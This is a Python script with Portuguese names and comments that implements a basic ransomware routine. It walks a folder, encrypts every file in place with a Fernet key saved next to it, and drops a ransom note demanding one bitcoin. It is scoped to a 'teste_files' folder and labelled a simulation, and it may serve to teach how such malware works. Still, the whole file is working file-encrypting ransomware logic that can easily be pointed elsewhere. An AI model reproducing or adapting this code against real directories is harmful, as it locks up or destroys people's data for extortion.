import os
from cryptography.fernet import Fernet


def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


def carregar_chave():
    return open("chave.key", "rb").read()


def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)


def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Evita criptografar o próprio script e a chave gerada
            if nome != "ransomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista


def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w", encoding="utf-8") as f:
        f.write("Seus arquivos foram resenhados.\n")
        f.write("Envie 1 bitcoin.")


def main():
    # Certifique-se de que a pasta de testes existe antes de rodar
    pasta_teste = "teste_files"
    if not os.path.exists(pasta_teste):
        os.makedirs(pasta_teste)
        print(f"Pasta '{pasta_teste}' criada. Coloque arquivos de teste nela.")
        return

    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos(pasta_teste)

    if not arquivos:
        print(f"Nenhum arquivo encontrado em '{pasta_teste}' para criptografar.")
        return

    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)

    criar_mensagem_resgate()
    print("Simulação concluída! Arquivos resenhados com sucesso.")


# Este bloco deve ficar fora de qualquer função, no final do arquivo
if __name__ == "__main__":
    main()